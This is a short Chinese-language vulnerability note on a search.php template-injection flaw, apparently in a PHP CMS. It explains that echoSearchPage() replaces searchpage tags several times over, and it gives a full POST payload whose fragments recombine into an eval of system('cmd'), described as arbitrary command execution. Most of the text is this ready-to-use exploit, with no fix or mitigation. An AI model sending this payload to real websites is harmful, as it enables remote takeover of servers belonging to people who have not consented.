漏洞详情:
	漏洞位于search.php处，echoSearchPage()函数对html中的searchpage标签进行了多次的替换，多次替换过程中不断组合形成payload
PostData:
	searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&ver=OST[9]))&9[]=sys&9[]=tem('cmd');
	可执行任意命令
	